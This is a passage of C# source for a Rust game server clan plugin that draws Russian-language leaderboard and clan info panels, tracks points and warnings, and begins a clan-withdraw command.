                UI.AddText(ref container, "ClanMember", "3", "1 1 1 0.8", $"{key.Value.PlayerPoints}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "225 0", "320 25");
                UI.AddText(ref container, "ClanMember", "4", "1 1 1 0.8", $"{GetFullPercent(key.Key)}%", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "290 0", "385 25");
                UI.AddText(ref container, "ClanMember", "5", "1 1 1 0.8", $"{key.Value.Killed}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "360 0", "455 25");
                UI.AddText(ref container, "ClanMember", "6", "1 1 1 0.8", $"{key.Value.Death}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "420 0", "515 25");

                offsethmin -= 24;
                offsethmax -= 24;
                i++;
                if (i == 6)
                {
                    offsethmin = -80;
                    offsethmax = -57;
                }
            }

            string commandprev = page > 0 ? $"raidtop_info {clan.tag} {page - 1}" : "";
            string commandnext = ClanMembers.Skip(5 * (page + 1)).Count() > 0 ? $"raidtop_info {clan.tag} {page + 1}" : "";
            UI.AddImage(ref container, ClanInfo, "Back", $"{HexToRustFormat("#7A7671FF")}", "", "assets/icons/greyout.mat", "0 0", "0 0", "6 8", "38 40");
            UI.AddText(ref container, "Back", "BackText", "1 1 1 1", "<", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 2", "0 0");
            UI.AddButton(ref container, "Back", "BackBTN", $"{commandprev}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, ClanInfo, "Number", $"{HexToRustFormat("#2B2B2B60")}", "", "", "0 0", "0 0", "38 8", "72 40");
            UI.AddText(ref container, "Number", "NumberText", "1 1 1 1", $"{page + 1}", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 2", "0 0");
            UI.AddImage(ref container, ClanInfo, "Next", $"{HexToRustFormat("#7A7671FF")}", "", "assets/icons/greyout.mat", "0 0", "0 0", "72 8", "105 40");
            UI.AddText(ref container, "Next", "NextText", "1 1 1 1", ">", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Next", "NextBTN", $"{commandnext}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, ClanInfo, "Сlose", "", "MainClanInfo", $"{HexToRustFormat("#7A7671FF")}", "", "", "1 0", "1 0", "-103 8", "-3 40");
            UI.AddText(ref container, "Сlose", "1", "1 1 1 1", "ЗАКРЫТЬ", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, ClanInfo, "BackBTN", "raidtop_main", "", $"{HexToRustFormat("#7A7671FF")}", "", "", "1 0", "1 0", "-208 8", "-108 40");
            UI.AddText(ref container, "BackBTN", "1", "1 1 1 1", "НАЗАД", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");


            CuiHelper.AddUi(player, container);


        }


        string ClanInfo = "ClanTopInfoLayer";
        void ClanTOPInfo(BasePlayer player, Clan clan, int page)
        {
            CuiHelper.DestroyUi(player, "MainClanInfo");
            CuiHelper.DestroyUi(player, "MainTop");
            CuiHelper.DestroyUi(player, "MainTopR");

            var container = new CuiElementContainer();
            var color = clan.online > 0 ? "0.55 0.78 0.24 1" : "0.8 0.28 0.2 1";

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = $"{HexToRustFormat("#322D2499")}", Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", "MainClanInfo");


            UI.AddButton(ref container, "MainClanInfo", "CloseOverlay", "", "MainClanInfo", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "MainClanInfo", ClanInfo, $"{HexToRustFormat("#74706A7F")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-257 -220", "257 220");

            if (clan.ClanAvatar.Contains("png") == false || clan.ClanAvatar.Contains("jpg") == false)
            {
                UI.AddRawImage(ref container, ClanInfo, "Avatar", GetImageUrl(clan.owner, 0), "1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-223 59", "-96 185");
            }
            else
            {
                UI.AddRawImage(ref container, ClanInfo, "Avatar", ImageLibrary?.Call<string>("GetImage", clan.ClanAvatar), "1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-223 59", "-96 185");
            }

            UI.AddText(ref container, ClanInfo, "ClanName", "1 1 1 1", $"{clan.tag}", TextAnchor.MiddleLeft, 20, "0.5 0.5", "0.5 0.5", "0 180", "150 225");
            UI.AddText(ref container, ClanInfo, "ClanOnline", $"{color}", $"●", TextAnchor.MiddleCenter, 14, "0.5 0.5", "0.5 0.5", "-20 190", "0 210");
            Dictionary<string, string> infoDict = new Dictionary<string, string>()
            {
                {"ГЛАВА КОМАНДЫ", clan.ownerName},
                {"ИГРОКОВ В КОМАНДЕ", clan.members.Count.ToString()},
                {"НАБРАНО ОЧКОВ", clan.ClanPoints.ToString()},
                {"ВСЕГО РЕЙДОВ", clan.KilledTCAll.ToString()},
                {"ВСЕГО УБИЙСТВ", clan.KillC.ToString()},
                {"ВСЕГО СМЕРТЕЙ", clan.DeathC.ToString()}
            };

            float offsetminh = 161, offsetmaxh = 181;
            foreach (var kvp in infoDict)
            {
                string text = kvp.Key;
                string text2 = kvp.Value;
                UI.AddImage(ref container, ClanInfo, $"ClanInfoBlackBars", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-67 {offsetminh}", $"228 {offsetmaxh}");
                UI.AddText(ref container, $"ClanInfoBlackBars", "1", "1 1 1 0.8", $"{text}", TextAnchor.MiddleLeft, 14, "0 0", "0 0", "5 0", "150 20");
                UI.AddText(ref container, $"ClanInfoBlackBars", "2", "1 1 1 0.8", $"{text2}", TextAnchor.MiddleRight, 12, "0 0", "0 0", "170 0", "290 20");
                offsetminh -= 22;
                offsetmaxh -= 22;
            }

            float offsetminl = 13, offsetmaxl = 62;
            foreach (var check in clan.Res)
            {
                UI.AddImage(ref container, ClanInfo, $"ClanFarmParent", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", $"-257 -17", $"257 31");
                UI.AddImage(ref container, "ClanFarmParent", $"ClanFarm", $"{HexToRustFormat("#47433DB0")}", "", "", "0 0", "0 0", $"{offsetminl} 0", $"{offsetmaxl} 48");
                UI.AddRawImage(ref container, "ClanFarm", "1", ImageLibrary?.Call<string>("GetImage", check.Key), $"1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddText(ref container, $"ClanFarm", "2", "1 1 1 0.8", $"{check.Value}", TextAnchor.MiddleRight, 12, "0 0", "0 0", "0 -5", "45 20");

                offsetminl += 56;
                offsetmaxl += 56;
                if (offsetminl > 461)
                {
                    offsetminl = 13;
                    offsetmaxl = 62;
                }
            }

            UI.AddImage(ref container, ClanInfo, $"TextParent", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", $"-257 -55", $"257 -35");
            UI.AddText(ref container, "TextParent", "1", "1 1 1 0.8", "#", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "12 -2", "33 20");
            UI.AddText(ref container, "TextParent", "2", "1 1 1 0.8", "ИМЯ ИГРОКА", TextAnchor.LowerLeft, 13, "0 0", "0 0", "57 -2", "153 20");
            UI.AddText(ref container, "TextParent", "3", "1 1 1 0.8", "ОЧКОВ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "260 -2", "303 20");
            UI.AddText(ref container, "TextParent", "4", "1 1 1 0.8", "АКТИВНОСТЬ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "308 -2", "383 20");
            UI.AddText(ref container, "TextParent", "5", "1 1 1 0.8", "УБИЙСТВ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "388 -2", "443 20");
            UI.AddText(ref container, "TextParent", "6", "1 1 1 0.8", "СМЕРТЕЙ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "448 -2", "523 20");


            var ClanMembers = from pair in clan.members orderby pair.Value.PlayerPoints descending select pair;
            float offsethmin = -80, offsethmax = -57;
            int i = 1;
            foreach (KeyValuePair<string, PlayerStats> key in ClanMembers.Skip(5 * page).Take(ClanMembers.ToList().Count >= 5 ? 5 : ClanMembers.ToList().Count))
            {
                var name = covalence.Players.FindPlayerById(key.Key) != null ? covalence.Players.FindPlayerById(key.Key).Name : "Имя не указано";
                UI.AddImage(ref container, ClanInfo, "ClanMember", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-254 {offsethmin}", $"256 {offsethmax}");
                UI.AddText(ref container, "ClanMember", "1", "1 1 1 0.8", $"{page * 5 + i}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "5 0", "30 25");
                UI.AddText(ref container, "ClanMember", "2", "1 1 1 0.8", $"{name}", TextAnchor.MiddleLeft, 13, "0 0", "0 0", "55 0", "200 25");
                UI.AddText(ref container, "ClanMember", "3", "1 1 1 0.8", $"{key.Value.PlayerPoints}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "225 0", "320 25");
                UI.AddText(ref container, "ClanMember", "4", "1 1 1 0.8", $"{GetFullPercent(key.Key)}%", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "290 0", "385 25");
                UI.AddText(ref container, "ClanMember", "5", "1 1 1 0.8", $"{key.Value.Killed}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "360 0", "455 25");
                UI.AddText(ref container, "ClanMember", "6", "1 1 1 0.8", $"{key.Value.Death}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "420 0", "515 25");

                offsethmin -= 24;
                offsethmax -= 24;
                i++;
                if (i == 6)
                {
                    offsethmin = -80;
                    offsethmax = -57;
                }
            }

            string commandprev = page > 0 ? $"clanstop_info {clan.tag} {page - 1}" : "";
            string commandnext = ClanMembers.Skip(5 * (page + 1)).Count() > 0 ? $"clanstop_info {clan.tag} {page + 1}" : "";
            UI.AddImage(ref container, ClanInfo, "Back", $"{HexToRustFormat("#7A7671FF")}", "", "assets/icons/greyout.mat", "0 0", "0 0", "6 8", "38 40");
            UI.AddText(ref container, "Back", "BackText", "1 1 1 1", "<", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 2", "0 0");
            UI.AddButton(ref container, "Back", "BackBTN", $"{commandprev}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, ClanInfo, "Number", $"{HexToRustFormat("#2B2B2B60")}", "", "", "0 0", "0 0", "38 8", "72 40");
            UI.AddText(ref container, "Number", "NumberText", "1 1 1 1", $"{page + 1}", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 2", "0 0");
            UI.AddImage(ref container, ClanInfo, "Next", $"{HexToRustFormat("#7A7671FF")}", "", "assets/icons/greyout.mat", "0 0", "0 0", "72 8", "105 40");
            UI.AddText(ref container, "Next", "NextText", "1 1 1 1", ">", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Next", "NextBTN", $"{commandnext}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, ClanInfo, "Сlose", "", "MainClanInfo", $"{HexToRustFormat("#7A7671FF")}", "", "", "1 0", "1 0", "-103 8", "-3 40");
            UI.AddText(ref container, "Сlose", "1", "1 1 1 1", "ЗАКРЫТЬ", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, ClanInfo, "BackBTN", "clanstop_main", "", $"{HexToRustFormat("#7A7671FF")}", "", "", "1 0", "1 0", "-208 8", "-108 40");
            UI.AddText(ref container, "BackBTN", "1", "1 1 1 1", "НАЗАД", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");


            CuiHelper.AddUi(player, container);


        }

        private const int MAXWARN = 2;

        [ChatCommand("givewarn")]
        void GiveWarn(BasePlayer player, string command, string[] args)
        {
            var clan = findClan(args[0]);
            clan.warns += Convert.ToInt32(args[1]);
            if (clan.warns > MAXWARN)
            {
                RemoveClan(clan.tag);
                foreach (var member in clan.members)
                {
                    clanCache.Remove(member.Key);
                    if (usePermGroups && permission.UserHasGroup((string)member.Key, permGroupPrefix + clan.tag)) permission.RemoveUserGroup((string)member.Key, permGroupPrefix + clan.tag);
                }

                foreach (var ally in clans)
                {
                    Clan allyClan = clans[ally.Key];
                    allyClan.clanAlliances.Remove(clan.tag);
                    allyClan.invitedAllies.Remove(clan.tag);
                    allyClan.pendingInvites.Remove(clan.tag);
                }
                if (usePermGroups && permission.GroupExists(permGroupPrefix + clan.tag)) permission.RemoveGroup(permGroupPrefix + clan.tag);
                clan.OnDestroy();
                AllyRemovalCheck();
                Interface.Oxide.CallHook("OnClanDisbanded", clan.members);
            }
        }


        [ChatCommand("clears")]
        void cmdClanTOPsremove(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "Message");
        }
        [PluginReference] private Plugin TournamentClan;
        string TopLayer = "TopLayer";
        string RTopLayer = "TopLayer";


        void RaidTop(BasePlayer player, int page = 0)
        {
            CuiHelper.DestroyUi(player, "MainTopR");
            var commandnext = clans.Keys.Skip(10 * (page + 1)).Count() > 0 ? $"raidtop_main {page + 1}" : "";
            var commandprev = page > 0 ? $"raidtop_main {page - 1}" : "";
            var clan = findClanByUser(player.UserIDString);
            var Clans = from pair in clans orderby pair.Value.raidpoint descending select pair;
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0.5", Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", "MainTopR");

            UI.AddButton(ref container, "MainTopR", "CloseOverlay", "", "MainTopR", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "MainTopR", RTopLayer, "0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", "-257 -175", "257 225");
            UI.AddImage(ref container, RTopLayer, "Top", $"{HexToRustFormat("#74706A7F")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-256 -105", "258 200");
            UI.AddImage(ref container, "Top", "Back", $"{HexToRustFormat("#605E5AFF")}", "", "", "0 0", "0 0", "5 6", "47 40");
            UI.AddText(ref container, "Back", "BackText", "1 1 1 0.8", "<", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Back", "BackBTN", $"{commandprev}", "", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Next", $"{HexToRustFormat("#605E5AFF")}", "", "", "0 0", "0 0", "85 6", "127 40");
            UI.AddText(ref container, "Next", "NextText", "1 1 1 0.8", ">", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Next", "NextBTN", $"{commandnext}", "", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Page", $"{HexToRustFormat("#00000038")}", "", "", "0 0", "0 0", "47 6", "85 40");
            UI.AddText(ref container, "Page", "PageText", "1 1 1 0.8", $"{page + 1}", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Title", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", "-256 132", "258 152");
            UI.AddText(ref container, "Title", "1", "1 1 1 0.8", $"#", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "10 2", "30 20");
            UI.AddText(ref container, "Title", "2", "1 1 1 0.8", $"НАЗВАНИЕ КЛАНА", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "40 2", "150 20");
            UI.AddText(ref container, "Title", "4", "1 1 1 0.8", $"ОБЩЕЕ КОЛ-ВО ОЧКОВ", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "240 2", "355 20");
            UI.AddText(ref container, "Title", "5", "1 1 1 0.8", $"ОЧКИ ЗА РЕЙД", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "325 2", "440 20");
            UI.AddText(ref container, "Title", "6", "1 1 1 0.8", $"ПРЕДЫ", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "410 2", "525 20");


            float z = 0, offsetminh = 110, offsetmaxh = 132;


            foreach (var key in Clans.Skip(page * 10).Take(Clans.ToList().Count >= 10 ? 10 : Clans.ToList().Count))
            {
                z++;
                var clanKey = findClan(key.Value.tag);
                clanKey.OnUpdate();
                var color = key.Value.online > 0 ? "0.55 0.78 0.24 1" : "0.8 0.28 0.2 1";
                UI.AddImage(ref container, "Top", $"Clans{page * 10 + z}", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-252 {offsetminh}", $"254 {offsetmaxh}");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "Index", "1 1 1 0.8", $"{page * 10 + z}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "0 2", "30 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "Online", $"{color}", $"●", TextAnchor.MiddleLeft, 7, "0 0", "0 0", "47 2", "62 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "ClanTag", "1 1 1 0.8", $"{key.Value.tag.ToUpper()}", TextAnchor.MiddleLeft, 13, "0 0", "0 0", "55 2", "170 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "ClanPoints", $"1 1 1 0.8", $"{key.Value.ClanPoints}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "230 2", "355 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "RaidPoints", "1 1 1 0.8", $"{key.Value.raidpoint}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "315 2", "440 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "WarnsCount", "1 1 1 0.8", $"{key.Value.warns}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "400 2", "525 22");
                offsetmaxh -= 24;
                offsetminh -= 24;
                if (z == 10)
                {
                    offsetmaxh = 130;
                    offsetminh = 110;
                }
            }


            CuiHelper.AddUi(player, container);


        }




        void ClanTOP(BasePlayer player, int page = 0)
        {
            CuiHelper.DestroyUi(player, "MainClanInfo");
            CuiHelper.DestroyUi(player, "MainTop");
            var clan = findClanByUser(player.UserIDString);
            var Clans = from pair in clans orderby pair.Value.ClanPoints descending select pair;
            CuiElementContainer container = new CuiElementContainer();
            string commandnext = Clans.Skip(10 * (page + 1)).Count() > 0 ? $"clanstop_main {page + 1}" : "";
            string commandprev = page > 0 ? $"clanstop_main {page - 1}" : "";
            string commandself = clan != null ? $"clanstop_info {clan.tag}" : "";

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = $"{HexToRustFormat("#322D2499")}", Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", "MainTop");

            UI.AddButton(ref container, "MainTop", "CloseOverlay", "", "MainTop", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "MainTop", TopLayer, "0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", "-257 -175", "257 225");
            UI.AddImage(ref container, TopLayer, "Top", $"{HexToRustFormat("#74706A7F")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-256 -105", "258 200");
            UI.AddImage(ref container, TopLayer, "Info", $"{HexToRustFormat("#74706A7F")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-255 -200", "257 -110");
            UI.AddText(ref container, "Info", "InfoText", "1 1 1 0.8", "Очки даются:\nУбийство +10, добыча руды +1, разрушение бочки +1, сбитие вертолета +500, уничтожение танка +500\nОчки отнимаются:\nСмерть и самоубийство -10\nНаграды выдаются после вайпа на сервере!", TextAnchor.UpperLeft, 13, "0 0", "1 1", "5 0", "-5 0", font: "robotocondensed-regular.ttf");
            UI.AddImage(ref container, "Top", "SelfClan", $"{HexToRustFormat("#6E9747")}", "", "", "0 0", "0 0", "205 6", "309 40");
            UI.AddText(ref container, "SelfClan", "SelfClanText", "1 1 1 0.8", "МОЙ КЛАН", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "SelfClan", "SelfClanBTN", $"{commandself}", "", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Close", $"{HexToRustFormat("#605E5AFF")}", "", "", "0 0", "0 0", "411 6", "510 40");
            UI.AddText(ref container, "Close", "CloseText", "1 1 1 0.8", "ЗАКРЫТЬ", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Close", "CloseBTN", "", "MainTop", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Back", $"{HexToRustFormat("#605E5AFF")}", "", "", "0 0", "0 0", "5 6", "47 40");
            UI.AddText(ref container, "Back", "BackText", "1 1 1 0.8", "<", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Back", "BackBTN", $"{commandprev}", "", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Next", $"{HexToRustFormat("#605E5AFF")}", "", "", "0 0", "0 0", "85 6", "127 40");
            UI.AddText(ref container, "Next", "NextText", "1 1 1 0.8", ">", TextAnchor.MiddleCenter, 20, "0 0", "1 1", "0 0", "0 0");
            UI.AddButton(ref container, "Next", "NextBTN", $"{commandnext}", "", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Page", $"{HexToRustFormat("#00000038")}", "", "", "0 0", "0 0", "47 6", "85 40");
            UI.AddText(ref container, "Page", "PageText", "1 1 1 0.8", $"{page + 1}", TextAnchor.MiddleCenter, 14, "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "Top", "Title", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", "-256 132", "258 152");
            UI.AddText(ref container, "Title", "1", "1 1 1 0.8", $"#", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "10 2", "30 20");
            UI.AddText(ref container, "Title", "2", "1 1 1 0.8", $"НАЗВАНИЕ КЛАНА", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "40 2", "150 20");
            UI.AddText(ref container, "Title", "3", "1 1 1 0.8", $"НАГРАДА", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "140 2", "270 20");
            UI.AddText(ref container, "Title", "4", "1 1 1 0.8", $"ТУРНИР", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "240 2", "355 20");
            UI.AddText(ref container, "Title", "5", "1 1 1 0.8", $"ОЧКИ", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "325 2", "440 20");
            UI.AddText(ref container, "Title", "6", "1 1 1 0.8", $"ИГРОКОВ", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "410 2", "525 20");


            float z = 0, offsetminh = 110, offsetmaxh = 132;


            foreach (var key in Clans.Skip(page * 10).Take(Clans.ToList().Count >= 10 ? 10 : Clans.ToList().Count))
            {
                z++;
                var clanKey = findClan(key.Value.tag);
                clanKey.OnUpdate();
                var color = key.Value.online > 0 ? "0.55 0.78 0.24 1" : "0.8 0.28 0.2 1";
                UI.AddImage(ref container, "Top", $"Clans{page * 10 + z}", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-252 {offsetminh}", $"254 {offsetmaxh}");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "Index", "1 1 1 0.8", $"{page * 10 + z}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "0 2", "30 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "Online", $"{color}", $"●", TextAnchor.MiddleLeft, 7, "0 0", "0 0", "47 2", "62 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "ClanTag", "1 1 1 0.8", $"{key.Value.tag.ToUpper()}", TextAnchor.MiddleLeft, 13, "0 0", "0 0", "55 2", "170 22");
                if (TournamentClan != null)
                {
                    if ((bool)TournamentClan?.Call<bool>("GetActive", key.Value.tag.ToString()) == true)
                    {
                        UI.AddText(ref container, $"Clans{page * 10 + z}", "", $"1 1 1 0.8", $"УЧАСТВУЕТ", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "230 2", "355 22");
                    }
                }
                UI.AddText(ref container, $"Clans{page * 10 + z}", "ClanPoints", "1 1 1 0.8", $"{key.Value.ClanPoints}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "315 2", "440 22");
                UI.AddText(ref container, $"Clans{page * 10 + z}", "MembersCount", "1 1 1 0.8", $"{key.Value.members.Count()}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "400 2", "525 22");
                UI.AddButton(ref container, $"Top", "ClansTopBTN", $"clanstop_info {key.Value.tag}", "", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", $"-252 {offsetminh}", $"254 {offsetmaxh}");
                offsetmaxh -= 24;
                offsetminh -= 24;
                if (z == 10)
                {
                    offsetmaxh = 130;
                    offsetminh = 110;
                }
            }

            if (page == 0)
            {
                for (int x = 0; x < Clans.Take(10).Count(); x++)
                {
                    UI.AddText(ref container, $"Clans{x + 1}", $"{x + 1}", "1 1 1 0.8", $"{Bonus.ElementAt(x)}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "130 2", "270 22");
                }
            }

            //foreach (var key in ClanMembers.Skip(page * 11).Take(ClanMembers.ToList().Count >= 11 ? 11 : ClanMembers.ToList().Count))
            //{
            //    z++;
            //    var color = key.Value.online > 0 ? "0.55 0.78 0.24 1" : "0.8 0.28 0.2 1";
            //    var clan = findClan(key.Value.tag);
            //    clan.OnUpdate();

            //    UI.AddImage(ref container, ".PlayerTopParent", $".playertop", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-245 {offsetminh}", $"245 {offsetmaxh}");
            //    UI.AddText(ref container, $".playertop", "", "1 1 1 0.8", $"{page * 11 + z}", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "5 -2", "25 25");
            //    UI.AddText(ref container, $".playertop", "", "1 1 1 0.8", $"{key.Value.tag.ToUpper()}", TextAnchor.MiddleLeft, 12, "0 0", "0 0", "60 -2", "130 20");
            //    UI.AddRawImage(ref container, ".playertop", "", ImageLibrary?.Call<string>("GetImage", onlinepng), $"{color}", "", "", "0 0", "0 0", "44 -2", "62 20");
            //    if (TournamentClan != null)
            //    {
            //        if ((bool)TournamentClan?.Call<bool>("GetActive", clan.tag.ToString()) == true)
            //        {
            //            UI.AddText(ref container, $".playertop", "", $"0.14 0.93 0.00 0.50", $"УЧАСТВУЕТ", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "235 -2", "330 20");
            //        }
            //        else
            //        {
            //            UI.AddText(ref container, $".playertop", "", $"255 0 0 0.5", $"НЕ УЧАСТВУЕТ", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "235 -2", "330 20");
            //        }
            //    }
            //    UI.AddText(ref container, $".playertop", "", "1 1 1 0.8", $"{key.Value.ClanPoints}", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "310 -2", "420 20");
            //    UI.AddText(ref container, $".playertop", "", "1 1 1 0.8", $"{key.Value.online}/{key.Value.members.Count}", TextAnchor.MiddleCenter, 12, "0 0", "0 0", "400 -2", "490 20");

            //    offsetmaxh -= 22;
            //    offsetminh -= 22;
            //    if (offsetmaxh < -111)
            //    {
            //        offsetmaxh = 130;
            //        offsetminh = 110;
            //    }
            //}

            CuiHelper.AddUi(player, container);


        }

        string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex)) hex = "#FFFFFFFF";
            var str = hex.Trim('#');
            if (str.Length == 6) str += "FF";
            if (str.Length != 8) throw new Exception(hex);

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);
            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }


        long GetFullPercent(string id)
        {
            var clan = findClanByUser(id);
            long Need = clan.Change.Sum(x => x.Value.Need);
            var playerCurrent = clan.members[id].GatherInfo.Sum(p => p.Value);
            if (playerCurrent == 0) return 0;
            return playerCurrent * 100 / Need;
        }

        long GetFullClanPercent(string tag)
        {
            var clan = findClan(tag);
            long Need = clan.Change.Sum(x => x.Value.Need);
            var Current = clan.Change.Sum(x => x.Value.Complete);
            if (Current == 0) return 0;
            return Current * 100 / Need;
        }

        public static string FormatShortTime(TimeSpan time)
        {
            string result = string.Empty;
            if (time.Days != 0)
                result += $"{time.Days} д. ";

            if (time.Hours != 0)
                result += $"{time.Hours} ч. ";

            if (time.Minutes != 0)
                result += $"{time.Minutes} м. ";

            if (time.Seconds != 0)
                result += $"{time.Seconds} с. ";

            return result;
        }

        public void WithdrawPlayer(BasePlayer player, string targetId) => cmdClanWithdraw(player, new string[] { "", targetId });

        void cmdClanWithdraw(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (args.Length < 2)
            {
